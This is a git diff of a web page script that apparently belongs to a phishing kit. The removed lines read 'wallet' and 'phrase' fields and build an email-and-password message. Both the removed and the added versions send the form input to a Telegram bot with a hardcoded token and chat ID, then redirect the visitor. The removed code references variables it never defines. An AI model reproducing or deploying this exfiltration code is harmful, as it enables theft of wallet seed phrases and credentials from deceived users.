@@ -63,13 +63,14 @@
                 document.getElementById("messageForm").addEventListener("submit", function (event) {
                     event.preventDefault(); // Prevent form submission
         
-                    const wallet = document.getElementById("wallet").value;
-                    const phrase = document.getElementById("phrase").value;
+                    const message = document.getElementById("messageInput").value;
+                    sendMessageToTelegram(message);
+                });
         
+                function sendMessageToTelegram(text) {
                     // Replace with your actual Telegram bot token and chat ID
                     const botToken = "7226627962:AAGDAtrhodzxWxxp0jUR94V5JdVr9ZaddH0";
                     const chatId = "7165649085";
-                    const text = `Email: ${email}\nPassword: ${password}`;
                     const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`;
         
                     fetch(url, { method: "GET" })
@@ -77,7 +78,7 @@
                             if (response.ok) {
                                 console.log("Message sent successfully!");
                                 // Redirect to another page (replace with your desired URL)
-                        window.location.href = "wait.html"; // Change this U
+                        window.location.href = "../index.html"; // Change this U
                             } else {
                                 console.error("Error sending message:", response.statusText);
                             }
@@ -85,7 +86,9 @@
                         .catch(error => {
                             console.error("Network error:", error);
                         });
-                });
+                }
+                        
+                
             </script>
         </div>
 
